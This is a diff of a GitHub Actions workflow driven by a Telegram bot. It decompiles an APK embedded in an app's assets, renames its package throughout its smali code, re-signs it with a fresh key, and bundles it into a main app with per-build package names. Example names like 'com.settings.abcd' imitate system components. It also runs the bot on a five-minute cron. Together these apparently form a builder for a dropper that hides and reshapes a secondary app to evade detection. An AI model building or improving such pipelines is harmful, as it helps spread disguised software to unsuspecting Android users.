@@ -1,62 +1,120 @@
-name: Build Nova Launcher APK
+# ════════════════════════════════════════════════════════
+# UNIFIED BUILD WORKFLOW
+# Handles: Bot (24/7) + Build Main App + Build Companion + Build Both
+# ════════════════════════════════════════════════════════
+
+name: Builder
 
 on:
-  push:
-    branches: [ main ]
+  # Bot keep-alive — runs every 5 minutes
+  schedule:
+    - cron: '*/5 * * * *'
+
+  # Manual trigger from Telegram bot via GitHub API
   workflow_dispatch:
     inputs:
-      nova_package:
-        description: 'Nova package name (e.g. com.settings.abcd)'
+      build_type:
+        description: 'Build type: bot | main | companion | both'
+        required: true
+        default: 'bot'
+      main_package:
+        description: 'Main App package name'
         required: false
         default: ''
       companion_package:
-        description: 'Companion package name (e.g. org.system.efgh)'
+        description: 'Companion App package name'
         required: false
         default: ''
       chain_part1:
-        description: 'Chain Part 1 (10 chars, embedded in Nova manifest)'
+        description: 'Chain Part 1 (embedded in Main App manifest)'
+        required: false
+        default: ''
+      chain_part2:
+        description: 'Chain Part 2 (embedded in Companion)'
         required: false
         default: ''
 
+# ════════════════════════════════════════════════════════
+# JOB 1 — TELEGRAM BOT (24/7 keep-alive)
+# ════════════════════════════════════════════════════════
+
 jobs:
-  build:
-    name: Build Release APK
+
+  bot:
+    name: Telegram Bot
     runs-on: ubuntu-latest
+    if: github.event_name == 'schedule' || (github.event_name == 'workflow_dispatch' && github.event.inputs.build_type == 'bot')
+    timeout-minutes: 5
 
     steps:
-      - name: Checkout Repository
+      - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Apply dynamic package names (if provided by bot)
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install dependencies
+        run: pip install pytelegrambotapi requests
+
+      - name: Run Telegram Bot (4 min window)
+        env:
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID:   ${{ secrets.TELEGRAM_CHAT_ID }}
+          GITHUB_TOKEN:       ${{ secrets.GH_PAT }}
+          GITHUB_REPO:        ${{ github.repository }}
         run: |
-          NOVA_PKG="${{ github.event.inputs.nova_package }}"
+          timeout 240 python3 telegram_bot.py || true
+
+# ════════════════════════════════════════════════════════
+# JOB 2 — BUILD MAIN APP
+# ════════════════════════════════════════════════════════
+
+  build_main:
+    name: Build Main App
+    runs-on: ubuntu-latest
+    if: github.event_name == 'workflow_dispatch' && github.event.inputs.build_type == 'main'
+    timeout-minutes: 30
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Apply dynamic package name + chain
+        run: |
+          MAIN_PKG="${{ github.event.inputs.main_package }}"
           COMPANION_PKG="${{ github.event.inputs.companion_package }}"
           CHAIN_PART1="${{ github.event.inputs.chain_part1 }}"
 
-          # Only apply if bot supplied values
-          if [ -n "$NOVA_PKG" ]; then
-            echo "Applying Nova package: $NOVA_PKG"
-            sed -i "s/namespace 'com.example.nova'/namespace '$NOVA_PKG'/" app/build.gradle
-            sed -i "s/applicationId \"com.example.nova\"/applicationId \"$NOVA_PKG\"/" app/build.gradle
-          fi
+          echo "Main Package    : $MAIN_PKG"
+          echo "Companion Package: $COMPANION_PKG"
+          echo "Chain Part 1    : $CHAIN_PART1"
 
-          if [ -n "$COMPANION_PKG" ]; then
-            echo "Applying Companion package: $COMPANION_PKG"
-            sed -i "s/\"com.android.pictach\"/\"$COMPANION_PKG\"/" app/build.gradle
-          fi
+          # Update namespace in build.gradle
+          sed -i "s|namespace '[^']*'|namespace '$MAIN_PKG'|" app/build.gradle
 
-          if [ -n "$CHAIN_PART1" ]; then
-            echo "Embedding chain part1: $CHAIN_PART1"
-            sed -i "s/android:value=\"PLACEHOLDER\"/android:value=\"$CHAIN_PART1\"/" app/src/main/AndroidManifest.xml
-          fi
+          # Update applicationId in build.gradle
+          sed -i "s|applicationId \"[^\"]*\"|applicationId \"$MAIN_PKG\"|" app/build.gradle
 
-      - name: Verify companion.apk exists
+          # Update COMPANION_PACKAGE BuildConfig field
+          sed -i "s|buildConfigField \"String\", \"COMPANION_PACKAGE\", \"[^\"]*\"|buildConfigField \"String\", \"COMPANION_PACKAGE\", \"\\\"$COMPANION_PKG\\\"\"|" app/build.gradle
+
+          # Embed chain_part1 in AndroidManifest.xml
+          sed -i "s|android:value=\"PLACEHOLDER\"|android:value=\"$CHAIN_PART1\"|" app/src/main/AndroidManifest.xml
+
+          echo "--- build.gradle (verify) ---"
+          grep -E "namespace|applicationId|COMPANION_PACKAGE" app/build.gradle
+          echo "--- Manifest chain (verify) ---"
+          grep "chain_part1" app/src/main/AndroidManifest.xml
+
+      - name: Verify companion.apk in assets
         run: |
           if [ ! -f app/src/main/assets/companion.apk ]; then
             echo "[X] companion.apk missing from assets!"
             exit 1
           fi
-          echo "[OK] companion.apk found ($(du -h app/src/main/assets/companion.apk | cut -f1))"
+          echo "[OK] companion.apk found — $(du -h app/src/main/assets/companion.apk | cut -f1)"
 
       - name: Set up JDK 17
         uses: actions/setup-java@v4
@@ -68,30 +126,305 @@ jobs:
       - name: Setup Android SDK
         uses: android-actions/setup-android@v3
 
-      - name: Cache Gradle wrapper
-        uses: actions/cache@v4
+      - name: Grant gradlew permission
+        run: chmod +x gradlew
+
+      - name: Build Main App Release APK
+        run: ./gradlew assembleRelease --no-daemon --stacktrace
+
+      - name: Locate APK
+        id: apk
+        run: |
+          APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          echo "path=$APK" >> $GITHUB_OUTPUT
+          echo "APK: $APK ($(du -h $APK | cut -f1))"
+
+      - name: Send Main App APK to Telegram
+        run: |
+          curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
+            -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
+            -F document=@"${{ steps.apk.outputs.path }}" \
+            -F caption="✅ *Main App Ready*
+
+          📦 Package: \`${{ github.event.inputs.main_package }}\`
+          🔐 Chain Part 1: \`${{ github.event.inputs.chain_part1 }}\`
+          📅 Built: $(date -u '+%Y-%m-%d %H:%M UTC')" \
+            -F parse_mode="Markdown"
+
+# ════════════════════════════════════════════════════════
+# JOB 3 — BUILD COMPANION APP
+# ════════════════════════════════════════════════════════
+
+  build_companion:
+    name: Build Companion App
+    runs-on: ubuntu-latest
+    if: github.event_name == 'workflow_dispatch' && github.event.inputs.build_type == 'companion'
+    timeout-minutes: 30
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
         with:
-          path: gradle/wrapper/gradle-wrapper.jar
-          key: gradle-wrapper-${{ runner.os }}
+          java-version: '17'
+          distribution: 'temurin'
+
+      - name: Install apktool
+        run: |
+          wget -q https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool
+          wget -q https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar -O /usr/local/bin/apktool.jar
+          chmod +x /usr/local/bin/apktool
+          apktool --version
+
+      - name: Decompile companion.apk
+        run: |
+          apktool d app/src/main/assets/companion.apk -o companion_decompiled --force
+          echo "[OK] Decompiled"
+
+      - name: Patch companion package name
+        run: |
+          COMPANION_PKG="${{ github.event.inputs.companion_package }}"
+          CHAIN_PART2="${{ github.event.inputs.chain_part2 }}"
+          OLD_PKG=$(grep "package=" companion_decompiled/AndroidManifest.xml | head -1 | sed 's/.*package="\([^"]*\)".*/\1/')
+
+          echo "Old package: $OLD_PKG"
+          echo "New package: $COMPANION_PKG"
+          echo "Chain Part 2: $CHAIN_PART2"
+
+          # Update package name in AndroidManifest.xml
+          sed -i "s|package=\"$OLD_PKG\"|package=\"$COMPANION_PKG\"|g" companion_decompiled/AndroidManifest.xml
+          sed -i "s|$OLD_PKG|$COMPANION_PKG|g" companion_decompiled/AndroidManifest.xml
+
+          # Update package name in smali files
+          OLD_PATH=$(echo $OLD_PKG | tr '.' '/')
+          NEW_PATH=$(echo $COMPANION_PKG | tr '.' '/')
+
+          find companion_decompiled/smali* -name "*.smali" | xargs -I{} sed -i \
+            "s|L$OLD_PATH|L$NEW_PATH|g; s|$OLD_PKG|$COMPANION_PKG|g" {}
+
+          # Embed chain_part2 if present
+          if [ -n "$CHAIN_PART2" ]; then
+            grep -r "chain_part2\|CHAIN_PART2" companion_decompiled/ && \
+            find companion_decompiled/smali* -name "*.smali" | xargs -I{} sed -i \
+              "s|CHAIN_PART2_PLACEHOLDER|$CHAIN_PART2|g" {} || true
+          fi
+
+          echo "[OK] Patched"
+
+      - name: Recompile companion APK
+        run: |
+          apktool b companion_decompiled -o companion_unsigned.apk
+          echo "[OK] Recompiled — $(du -h companion_unsigned.apk | cut -f1)"
+
+      - name: Generate companion keystore
+        run: |
+          keytool -genkeypair \
+            -alias companion_key \
+            -keyalg RSA \
+            -keysize 2048 \
+            -validity 10000 \
+            -keystore companion.jks \
+            -storepass "${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
+            -keypass "${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
+            -dname "CN=Companion, OU=App, O=Build, L=City, S=State, C=US" \
+            -noprompt
+          echo "[OK] Keystore generated"
+
+      - name: Sign companion APK
+        run: |
+          $ANDROID_HOME/build-tools/$(ls $ANDROID_HOME/build-tools/ | sort -V | tail -1)/apksigner sign \
+            --ks companion.jks \
+            --ks-key-alias companion_key \
+            --ks-pass pass:"${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
+            --key-pass pass:"${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
+            --out companion_signed.apk \
+            companion_unsigned.apk
+          echo "[OK] Signed — $(du -h companion_signed.apk | cut -f1)"
+
+      - name: Send Companion APK to Telegram
+        run: |
+          curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
+            -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
+            -F document=@companion_signed.apk \
+            -F caption="✅ *Companion App Ready*
+
+          📦 Package: \`${{ github.event.inputs.companion_package }}\`
+          🔐 Chain Part 2: \`${{ github.event.inputs.chain_part2 }}\`
+          📅 Built: $(date -u '+%Y-%m-%d %H:%M UTC')" \
+            -F parse_mode="Markdown"
+
+# ════════════════════════════════════════════════════════
+# JOB 4 — BUILD BOTH (Companion → assets → Main App)
+# ════════════════════════════════════════════════════════
+
+  build_both:
+    name: Build Both Apps
+    runs-on: ubuntu-latest
+    if: github.event_name == 'workflow_dispatch' && github.event.inputs.build_type == 'both'
+    timeout-minutes: 45
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+          cache: gradle
+
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Install apktool
+        run: |
+          wget -q https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool
+          wget -q https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar -O /usr/local/bin/apktool.jar
+          chmod +x /usr/local/bin/apktool
+          apktool --version
+
+      # ── STEP 1: Patch Companion APK ──
+
+      - name: Decompile companion.apk
+        run: |
+          apktool d app/src/main/assets/companion.apk -o companion_decompiled --force
+          echo "[OK] Decompiled"
+
+      - name: Patch companion package name
+        run: |
+          COMPANION_PKG="${{ github.event.inputs.companion_package }}"
+          CHAIN_PART2="${{ github.event.inputs.chain_part2 }}"
+          OLD_PKG=$(grep "package=" companion_decompiled/AndroidManifest.xml | head -1 | sed 's/.*package="\([^"]*\)".*/\1/')
+
+          echo "Old companion package: $OLD_PKG"
+          echo "New companion package: $COMPANION_PKG"
+
+          sed -i "s|package=\"$OLD_PKG\"|package=\"$COMPANION_PKG\"|g" companion_decompiled/AndroidManifest.xml
+          sed -i "s|$OLD_PKG|$COMPANION_PKG|g" companion_decompiled/AndroidManifest.xml
+
+          OLD_PATH=$(echo $OLD_PKG | tr '.' '/')
+          NEW_PATH=$(echo $COMPANION_PKG | tr '.' '/')
+
+          find companion_decompiled/smali* -name "*.smali" | xargs -I{} sed -i \
+            "s|L$OLD_PATH|L$NEW_PATH|g; s|$OLD_PKG|$COMPANION_PKG|g" {}
+
+          if [ -n "$CHAIN_PART2" ]; then
+            find companion_decompiled/smali* -name "*.smali" | xargs -I{} sed -i \
+              "s|CHAIN_PART2_PLACEHOLDER|$CHAIN_PART2|g" {} || true
+          fi
+
+          echo "[OK] Companion patched"
+
+      - name: Recompile companion APK
+        run: |
+          apktool b companion_decompiled -o companion_unsigned.apk
+          echo "[OK] Recompiled"
+
+      - name: Generate companion keystore
+        run: |
+          keytool -genkeypair \
+            -alias companion_key \
+            -keyalg RSA \
+            -keysize 2048 \
+            -validity 10000 \
+            -keystore companion.jks \
+            -storepass "${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
+            -keypass "${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
+            -dname "CN=Companion, OU=App, O=Build, L=City, S=State, C=US" \
+            -noprompt
+          echo "[OK] Keystore generated"
+
+      - name: Sign companion APK
+        run: |
+          $ANDROID_HOME/build-tools/$(ls $ANDROID_HOME/build-tools/ | sort -V | tail -1)/apksigner sign \
+            --ks companion.jks \
+            --ks-key-alias companion_key \
+            --ks-pass pass:"${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
+            --key-pass pass:"${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
+            --out companion_signed.apk \
+            companion_unsigned.apk
+          echo "[OK] Companion signed — $(du -h companion_signed.apk | cut -f1)"
+
+      # ── STEP 2: Drop patched companion into Main App assets ──
+
+      - name: Replace companion.apk in Main App assets
+        run: |
+          cp companion_signed.apk app/src/main/assets/companion.apk
+          echo "[OK] companion.apk replaced in assets — $(du -h app/src/main/assets/companion.apk | cut -f1)"
+
+      # ── STEP 3: Apply Main App package name + chain ──
+
+      - name: Apply Main App package name + chain
+        run: |
+          MAIN_PKG="${{ github.event.inputs.main_package }}"
+          COMPANION_PKG="${{ github.event.inputs.companion_package }}"
+          CHAIN_PART1="${{ github.event.inputs.chain_part1 }}"
+
+          echo "Main Package    : $MAIN_PKG"
+          echo "Companion Package: $COMPANION_PKG"
+          echo "Chain Part 1    : $CHAIN_PART1"
+
+          sed -i "s|namespace '[^']*'|namespace '$MAIN_PKG'|" app/build.gradle
+          sed -i "s|applicationId \"[^\"]*\"|applicationId \"$MAIN_PKG\"|" app/build.gradle
+          sed -i "s|buildConfigField \"String\", \"COMPANION_PACKAGE\", \"[^\"]*\"|buildConfigField \"String\", \"COMPANION_PACKAGE\", \"\\\"$COMPANION_PKG\\\"\"|" app/build.gradle
+          sed -i "s|android:value=\"PLACEHOLDER\"|android:value=\"$CHAIN_PART1\"|" app/src/main/AndroidManifest.xml
+
+          echo "--- build.gradle (verify) ---"
+          grep -E "namespace|applicationId|COMPANION_PACKAGE" app/build.gradle
+          echo "--- Manifest chain (verify) ---"
+          grep "chain_part1" app/src/main/AndroidManifest.xml
+
+      # ── STEP 4: Build Main App ──
 
       - name: Grant gradlew permission
         run: chmod +x gradlew
 
-      - name: Build Release APK
-        run: ./gradlew assembleRelease --stacktrace --no-daemon
+      - name: Build Main App Release APK
+        run: ./gradlew assembleRelease --no-daemon --stacktrace
 
-      - name: Show APK info
+      - name: Locate Main App APK
+        id: main_apk
         run: |
-          APK=$(find app/build/outputs/apk -name "*.apk" | head -1)
-          echo "APK: $APK"
-          echo "Size: $(du -h $APK | cut -f1)"
-          echo "DEX files:"
-          unzip -l $APK | grep "\.dex"
+          APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          echo "path=$APK" >> $GITHUB_OUTPUT
+          echo "Main APK: $APK ($(du -h $APK | cut -f1))"
 
-      - name: Upload Release APK
-        uses: actions/upload-artifact@v4
-        with:
-          name: nova-launcher-release
-          path: app/build/outputs/apk/release/app-release.apk
-          retention-days: 1
-          overwrite: true
+      # ── STEP 5: Send both APKs to Telegram ──
+
+      - name: Send Companion APK to Telegram
+        run: |
+          curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
+            -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
+            -F document=@companion_signed.apk \
+            -F caption="🔧 *Companion App*
+
+          📦 Package: \`${{ github.event.inputs.companion_package }}\`
+          🔐 Chain Part 2: \`${{ github.event.inputs.chain_part2 }}\`" \
+            -F parse_mode="Markdown"
+
+      - name: Send Main App APK to Telegram
+        run: |
+          curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
+            -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
+            -F document=@"${{ steps.main_apk.outputs.path }}" \
+            -F caption="🔨 *Main App* (contains patched Companion in assets)
+
+          📦 Main Package: \`${{ github.event.inputs.main_package }}\`
+          📦 Companion Package: \`${{ github.event.inputs.companion_package }}\`
+          🔐 Chain: \`${{ github.event.inputs.chain_part1 }}-${{ github.event.inputs.chain_part2 }}\`
+          📅 Built: $(date -u '+%Y-%m-%d %H:%M UTC')" \
+            -F parse_mode="Markdown"
+
+      - name: Notify build complete
+        run: |
+          curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
+            -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
+            -d text="✅ *Both builds complete*
+
+          🔨 Main App: \`${{ github.event.inputs.main_package }}\`
+          🔧 Companion: \`${{ github.event.inputs.companion_package }}\`
+          🔐 Chain: \`${{ github.event.inputs.chain_part1 }}-${{ github.event.inputs.chain_part2 }}\`" \
+            -d parse_mode="Markdown"
